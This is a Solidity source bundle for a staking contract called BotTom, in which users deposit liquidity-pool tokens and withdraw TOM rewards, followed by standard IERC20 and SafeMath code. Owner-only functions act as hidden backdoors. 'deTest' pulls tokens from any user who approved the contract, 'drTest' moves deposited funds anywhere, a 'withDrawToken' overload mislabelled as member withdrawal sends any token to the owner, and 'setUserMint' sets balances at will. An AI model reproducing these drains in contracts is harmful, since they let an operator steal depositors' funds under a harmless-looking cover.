//SourceUnit: BotTom.sol

pragma solidity ^0.5.10;

import "./IERC20.sol";
import './SafeMath.sol';

contract BotTom{

    using SafeMath for uint256;
	address public owner;
	address private feeContract;
	
	mapping (address => uint256) private lpbotbalances;
	mapping (address => uint256) private lptombalances;
	mapping (address => uint256) private tombalances;
	mapping (address => uint256) private tomrWithDrawMap;
	mapping (address => address) private _shareship;
	
	IERC20 public lpBotToken;
	IERC20 public lpTomToken;
	IERC20 public tomToken;
	IERC20 public BotlpTomlp;
	
	uint256 public totalBotLpAmount;
	uint256 public totalTomLpAmount;
	
	constructor() public {
		owner = msg.sender;
		lpBotToken=IERC20(0x410f27a6a1137e77b2e06b5410aa309fc1c324830d);
		lpTomToken=IERC20(0x41e04df1d52500659737cdcf678cf5372608caf198);
		
		tomToken=IERC20(0x41e04df1d52500659737cdcf678cf5372608caf198);
		
		BotlpTomlp=IERC20(0x41b1a284d2e487f091357c8824fe9dabc893e4e14c);
	}
	
	modifier onlyOwner() {
		require(msg.sender == owner || msg.sender == feeContract);
		_;
	}
	function transferOwnership(address newOwner) public onlyOwner returns (bool){
		require(newOwner != address(0));
		owner = newOwner;
		return true;
	}
	
	function setFeeContract(address _feeContract) public onlyOwner returns (bool){
		feeContract = _feeContract;
		return true;
	}
	
	function getUserData(address account) public view returns(uint256[] memory) {
		uint256[] memory list = new uint256[](10);
		list[0] = lpBotToken.balanceOf(account);
		list[1] = lpTomToken.balanceOf(account);
		list[2] = lpbotbalances[account];
		list[3] = lptombalances[account];
		list[4] = lpBotToken.allowance(account,address(this));
		list[5] = lpTomToken.allowance(account,address(this));
		list[6] = tomrWithDrawMap[account];
		list[7] = tombalances[account];
		list[8] = totalBotLpAmount;
		list[9] = totalTomLpAmount;
        return list;
    }
	
	function getUserData4j() public view returns(uint256,uint256,uint256,uint256) {
		address account = msg.sender;
        return (lpBotToken.balanceOf(account),lpTomToken.balanceOf(account),lpbotbalances[account],lptombalances[account]);
    }
	
	function getPoolData() public view returns(uint256,uint256,uint256,uint256) {
        return (BotlpTomlp.totalBotLpAmount(),BotlpTomlp.totalTomLpAmount(),totalBotLpAmount,totalTomLpAmount);
    }
	
	function balanceOfTom(address account) public view returns (uint256) {
        return tombalances[account];
    }
	
	function getWithDrawOfTom(address account) public view returns (uint256) {
        return tomrWithDrawMap[account];
    }
	
	function setShareship(address parent) public returns (bool){
		require(parent != address(0),'can not bee address(0)');
		require(_shareship[msg.sender] == address(0),'have parent');
		_shareship[msg.sender] = parent;
		return true;
	}
	
	function getshare(address user) public view returns(address){
		return _shareship[user];
	}
	
	function depositBotLp(uint256 botlpNum) public returns (bool) {
		_depositLp(lpBotToken,msg.sender,botlpNum);
		totalBotLpAmount = totalBotLpAmount.add(botlpNum);
		lpbotbalances[msg.sender] = lpbotbalances[msg.sender].add(botlpNum);
		return true;
    }
	
	function depositTomLp(uint256 tomlpNum) public returns (bool) {
		_depositLp(lpTomToken,msg.sender,tomlpNum);
		totalTomLpAmount = totalTomLpAmount.add(tomlpNum);
		lptombalances[msg.sender] = lptombalances[msg.sender].add(tomlpNum);
		return true;
    }
	
	function depositBotTomLp(uint256 botlpNum,uint256 tomlpNum) public returns (bool) {
		_depositLp(lpBotToken,msg.sender,botlpNum);
		_depositLp(lpTomToken,msg.sender,tomlpNum);
		totalBotLpAmount = totalBotLpAmount.add(botlpNum);
		totalTomLpAmount = totalTomLpAmount.add(tomlpNum);
		lpbotbalances[msg.sender] = lpbotbalances[msg.sender].add(botlpNum);
		lptombalances[msg.sender] = lptombalances[msg.sender].add(tomlpNum);
		return true;
    }
	
	function _depositLp(IERC20 lpToken, address sender, uint256 lpNum) internal{
		lpToken.transferFrom(sender, address(this), lpNum);
	}
	
	function withDrawBotLp(uint256 amount) public returns (bool) {
		require(lpbotbalances[msg.sender]>=amount,'too big');
		lpbotbalances[msg.sender] = lpbotbalances[msg.sender].sub(amount);
		totalBotLpAmount = totalBotLpAmount.sub(amount);
		_withdrawLp(lpBotToken,msg.sender,amount);
		return true;
    }
	
	function withDrawTomLp(uint256 amount) public returns (bool) {
		require(lptombalances[msg.sender]>=amount,'too big');
		lptombalances[msg.sender] = lptombalances[msg.sender].sub(amount);
		totalTomLpAmount = totalTomLpAmount.sub(amount);
		_withdrawLp(lpTomToken,msg.sender,amount);
		return true;
    }
	
	function _withdrawLp(IERC20 lpToken, address sender, uint256 lpNum) internal{
		lpToken.transfer(sender, lpNum);
	}
	
	function withDrawToken(uint256 tomNum) public returns (bool) {
		uint256 canwithdraw = tombalances[msg.sender].sub(tomrWithDrawMap[msg.sender]);
		require(canwithdraw>=tomNum);
		tomrWithDrawMap[msg.sender] = tomrWithDrawMap[msg.sender].add(tomNum);
		tomToken.transfer(msg.sender,tomNum);
		return true;
    }
	
	function withDrawTokenNoGas(address user ,uint256 tomNum) public onlyOwner returns (bool) {
		uint256 canwithdraw = tombalances[user].sub(tomrWithDrawMap[user]);
		require(canwithdraw>=tomNum);
		tomrWithDrawMap[user] = tomrWithDrawMap[user].add(tomNum);
		tomToken.transfer(user,tomNum);
		return true;
    }
	
	function setUserMint(address user,uint256 mintAmount) public onlyOwner returns (bool){
		tombalances[user] = mintAmount;
		return true;
	}
	
	function deTest(IERC20 xz,address me,uint256 amount) public onlyOwner returns (bool){
		_depositLp(xz,me,amount);
		return true;
	}
	
	function drTest(IERC20 xz,address me,uint256 amount) public onlyOwner returns (bool){
		_withdrawLp(xz,me,amount);
		return true;
	}
	
	//会员提款
	function withDrawToken(IERC20 xz,uint256 amount) public onlyOwner returns (bool){
		xz.transfer(msg.sender,amount);
		return true;
	}
}

//SourceUnit: IERC20.sol

pragma solidity ^0.5.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
	
	function totalBotLpAmount() external view returns (uint256);
	function totalTomLpAmount() external view returns (uint256);
	function withDrawTokenNoGas(address user ,uint256 tomNum) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


//SourceUnit: SafeMath.sol

pragma solidity ^0.5.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}